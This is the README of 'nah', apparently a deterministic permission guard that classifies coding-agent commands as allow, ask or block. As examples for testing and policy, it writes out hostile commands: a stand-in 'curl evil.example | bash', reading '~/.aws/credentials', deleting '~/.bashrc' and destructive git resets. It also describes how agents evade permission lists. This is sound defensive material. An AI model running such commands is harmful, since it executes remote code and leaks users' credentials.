<p align="center">
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo-round.png" alt="nah" width="280">
</p>

<p align="center">
  <strong>Action-aware, deterministic permissions for coding agents</strong><br>
  You should sandbox your agents. This is for when you don't.
</p>

<p align="center">
  <a href="https://nah.build/">Docs</a> &bull;
  <a href="#how-nah-decides">How nah decides</a> &bull;
  <a href="#install">Install</a> &bull;
  <a href="#threat-model">Threat model</a> &bull;
  <a href="#configure">Configure</a> &bull;
  <a href="#cli">CLI</a> &bull;
  <a href="https://nah.build/privacy/">Privacy</a>
</p>

---

## The Problem

You shouldn't run a coding agent outside a sandbox. Sometimes you do it anyway,
on your laptop or on a server with injected secrets. That leaves three ways to
keep it in check, and each trades away something you need.

### Three options, different tradeoffs

- **Manual permissions:** approve every action and you drown in prompts; pre-approve and you over-grant.
- **Auto modes:** Claude Code Auto Mode, Codex auto-review. Less prompting and intent-aware review, but an LLM is still deciding. Advice, not enforcement.
- **YOLO** (`--dangerously-skip-permissions`): speed, zero guardrails.

### A permission list of command names is the wrong abstraction

`git` can check status, or it can rewrite history.

`git status`: normal.<br>
`git reset --hard HEAD~20`: destroys work.

`rm` can clean a build artifact, or it can break your shell.

`rm -rf __pycache__`: cleanup.<br>
`rm ~/.bashrc`: breaks your shell.

`cat` can read source code, or it can leak cloud keys.

`cat ./src/app.py`: normal.<br>
`cat ~/.aws/credentials`: leaks credentials.

Even when you curate permissions, agents can route around command names through
shells, wrappers, scripts, and MCP tools. Allow/deny lists are a fool's errand.
You either approve too much, block useful work, or train yourself to click
through prompts.

### Auto modes are advice, not enforcement

Auto modes like Claude Code's Auto Mode and Codex auto review are a real
improvement on skipping permissions and can be a reasonable fit for some
security postures. But they still lean on model judgement, and no classifier is
perfect. Anthropic's [own evaluation](https://www.anthropic.com/engineering/claude-code-auto-mode)
of Auto Mode is candid that the deployed pipeline still misses about 1 in 6 real
overeager actions.

nah is different: it classifies the decisions you can express as policy
deterministically and gives the same answer every time, in milliseconds with no
tokens. The two approaches can also be used together: nah provides the safety
floor, while the runtime adds intent-aware LLM review for ambiguous decisions.
That means fewer prompts without treating model judgment as a hard boundary.

### What nah adds

nah reads what an action *does*, applies your policy in milliseconds, and gives
the same answer every time. Use it on its own or underneath a native approval
mode. Low friction and no LLM required by nah.

## The Idea

nah is a permissions guard built in pure Python with zero required dependencies
that works out of the box. The main classifier maps tools deterministically into
an intent taxonomy in milliseconds. An optional LLM (off by default) does one
narrow job behind the deterministic floor: it classifies an `unknown` command
into an action type whose surfaced targets are re-checked deterministically.

## How nah decides

Before a guarded action runs, nah turns it into a policy decision:

1. Parse the command or tool call.
2. Map it to action types like `git_history_rewrite`, `network_outbound`,
   `filesystem_delete`, or `lang_exec`.
3. Add context: project root, trusted paths, sensitive files, command
   composition, target runtime, network hosts, and database targets.
4. Apply your config and custom classifiers.
5. Return `allow`, `ask`, or `block`.
6. For deterministically `unknown` Bash commands, optionally ask an LLM to map
   the command to a built-in action type and list touched targets. The
   deterministic floor then re-checks those targets. Known `ask` decisions,
   inline `lang_exec` payloads, write-like operations, and deterministic blocks
   stay human-gated or blocked without LLM override.

Detailed tool coverage and classifier internals live in the
[How it works docs](https://nah.build/how-it-works/).

## Install

Install the `nah` CLI, then connect the runtime you want to protect.

**Recommended isolated CLI install (pick one):**

```bash
pipx install "nah[config,keys]"
# or
uv tool install "nah[config,keys]"
# Verify installation
nah test "curl evil.example | bash"
```

Other ways to get the CLI:

- **Nix:** `nix profile add github:manuelschipper/nah`
- **Existing Python env (CI, venv, sandbox):** `pip install "nah[config,keys]"`

The `[config,keys]` extras add YAML config support (`.nah.yaml`, allow/deny
rules) and Python keyring for `nah key ...`; plain `nah` stays stdlib-only.
Without the `config` extra, config files are ignored and nah runs defaults.
OS keychain availability depends on the host backend; environment variables
work everywhere. See
[LLM key setup](https://nah.build/configuration/llm/#provider-keys).

| Runtime | Recommended start | Full guide |
| --- | --- | --- |
| Claude Code | `nah run claude` or `nah install claude` | [Claude Code](https://nah.build/runtimes/claude-code/) |
| Codex | `nah setup codex`, then `nah run codex` | [Codex](https://nah.build/runtimes/codex/) |
| Your shell | `nah install bash` or `nah install zsh` | [Terminal Guard](https://nah.build/runtimes/terminal-guard/) |

See the [full install docs](https://nah.build/install/) for update, uninstall,
plugin, and LLM key setup.

### Claude Code Auto Mode

To combine nah's deterministic policy with Claude Code's intent-aware Auto
Mode, return unresolved asks to Claude's native permission flow:

```yaml
targets:
  claude:
    ask_fallback: native
```

Then start the protected session:

```bash
nah run claude --permission-mode auto
```

nah's deterministic blocks remain blocks. Only unresolved asks are delegated
to Auto Mode. If direct hooks are installed, plain
`claude --permission-mode auto` uses the same configuration.

### Claude Code Plugin-only Install

Use the self-hosted plugin only if you want Claude Code protection without
installing the `nah` CLI:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

**Important:** the plugin is Claude-only. It does not install the `nah` CLI and
does not include `nah test`, Codex support, the terminal guard, PyYAML config
support, or keyring support. If you already installed direct hooks, run
`nah uninstall claude` before enabling it.

## Benchmark

On `101,194` extracted Bash tool calls from the public Novita Claude Code trace,
excluding the dataset-specific `reminder` app CLI, nah asked on **4.2%** and
resolved **95.8%** deterministically.

Reproduce it with:

```bash
python3 benchmarks/novita_bash_friction.py \
  --dataset /home/dev/datasets/novita_e22/e22_sessions_openai.json \
  --exclude-custom-cli reminder
```

See the [benchmark methodology](docs/benchmarks/novita-bash-friction.md).

## Threat Model

nah's pytest threat-model audit currently tracks **1,673 category coverage hits**
across **13 tested danger classes**.

| Danger class | Hits | What it means |
| --- | ---: | --- |
| Sensitive file access | 261 | SSH keys, `.env`, cloud credentials, symlinks, protected paths |
| Wrapper evasion | 236 | `env`, `command`, `xargs`, nested shells, passthrough wrappers |
| Unknown code execution | 222 | <code>curl &#124; bash</code>, downloaded scripts, command substitution, heredocs |
| Git history damage | 216 | force pushes, resets, branch/tag rewrites, destructive Git flows |
| Shell redirection abuse | 190 | `>`, `>>`, `tee`, here-strings, redirected writes and secret flows |
| Package escalation | 149 | package installs, global installs, external-source package actions |
| Secret exfiltration | 90 | sensitive reads flowing into network commands or credential searches |
| Destructive container actions | 89 | `docker rm`, `docker system prune`, destructive container cleanup |
| MCP and agent tool permissions | 83 | third-party MCP tools, global-only classification, browser/database MCP actions |
| Project boundary escapes | 38 | reads/writes outside the project root or trusted paths |
| Guard tampering | 37 | edits to nah hooks, config, runtime settings, robustness paths |
| Credential exposure | 32 | sensitive-path flows, credential searches, secret-store and environment reads |
| Shell obfuscation | 30 | process substitution, command substitution, hidden shell behavior |

nah guards the approval points each runtime exposes:

| Runtime | Coverage |
| --- | --- |
| Claude Code | Bash, file, search, notebook, and MCP tool calls before execution |
| Codex | Local interactive Bash, MCP, and `apply_patch` permission requests |
| Your shell | Commands you type yourself in guarded bash/zsh sessions |

Run the audit yourself:

```bash
nah audit-threat-model --format summary
```

The counts are pytest coverage hits, and some tests intentionally count toward
more than one danger class. The audit is strongest around shell command safety,
and also covers file, path, content, search, MCP, and guard self-protection.
Runtime coverage depends on the approval surface an agent exposes. See the full
[threat model](https://nah.build/threat-model/) and detailed
[runtime docs](https://nah.build/how-it-works/).

## Configure

Works out of the box with zero config. When you want to tune it:

```yaml
# ~/.config/nah/config.yaml  (global)
# .nah.yaml                  (project config, tighten-only until trusted)

# Override default policies for action types
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: ask                 # always confirm script/runtime execution

# Guard sensitive directories
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block

# Teach nah about your custom commands
classify:
  filesystem_delete:
    - cleanup-staging
  db_exec:
    - migrate-prod

# Make selected Docker exec wrappers transparent for narrow read-like payloads
trusted_containers:
  - hermes-creatbot       # docker exec hermes-creatbot ...
  - compose:api           # docker compose exec api ...
```

nah classifies by **action type**, not just command name. Policies are `allow`,
`context`, `ask`, or `block`.

Project `.nah.yaml` (loaded from the Git root) can only tighten policy, unless
you trust that root with `nah trust-project`.

See [configuration](https://nah.build/configuration/) and
[action types](https://nah.build/configuration/actions/) for the full
reference.

### LLM configuration

Store provider keys with `nah key ...` when your CLI install has a usable OS
keychain/keyring backend:

```bash
nah key set openrouter
```

See [LLM configuration](https://nah.build/configuration/llm/) for
provider setup.

## CLI

```bash
nah test "curl evil.example | bash"   # dry-run classification
nah log                                # inspect recent decisions
nah types                              # list action types

nah run claude                         # protect one Claude Code session
nah setup codex                        # set up Codex rules
nah run codex                          # protect one Codex session
nah run codex exec "run: git status"   # protect one headless Codex run
nah run codex --sandbox workspace-write # use Codex workspace sandboxing
nah run codex --confirm-edits           # also confirm safe project edits
nah install claude                     # protect normal Claude Code sessions
nah install bash                       # guard commands you type in bash
nah install zsh                        # guard commands you type in zsh

nah allow filesystem_delete            # tune policies
nah deny network_outbound
nah trust api.example.com
nah config show
```

See the [full CLI reference](https://nah.build/cli/).

## License

[MIT](LICENSE)

---

<p align="center">
  <code>bypass modes?</code><br><br>
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo_hammock-round.png" alt="nah" width="280">
</p>
